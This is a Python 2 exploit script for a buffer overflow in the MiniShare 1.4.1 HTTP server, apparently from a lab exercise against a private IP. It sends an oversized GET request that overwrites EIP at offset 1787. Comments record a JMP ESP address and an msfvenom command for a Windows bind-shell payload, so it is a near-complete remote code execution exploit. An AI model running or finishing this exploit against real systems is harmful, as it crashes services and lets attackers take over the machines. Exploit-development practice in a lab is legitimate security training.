#!/usr/bin/python

import socket
import sys
import struct

banner = """
#----------------------------------------------#
MiniShare 1.4.1 HTTP Exploit - Offset & JMP ESP
#----------------------------------------------#
"""

print banner
#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
#shellcode = ()

#EIP = 36684335 -> offset at 1787
offset = 'A'*1787 + 'B'*4

#JMP ESP = !mona jmp -r esp -> 0x7c9d30d7 or \xd7\x30\x9d\x7c
#nowjump = '\xd7\x30\x9d\x7c'

#bufferandshellcode
sploit = offset + "C"*(2200-len(offset))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "\nDestroy them with lazers..."
s.connect(('172.16.73.129',80))
s.send('GET ' + sploit + ' HTTP/1.1\r\n\r\n')
s.close
print "\nFire in the hole! Go pick up the pieces!"
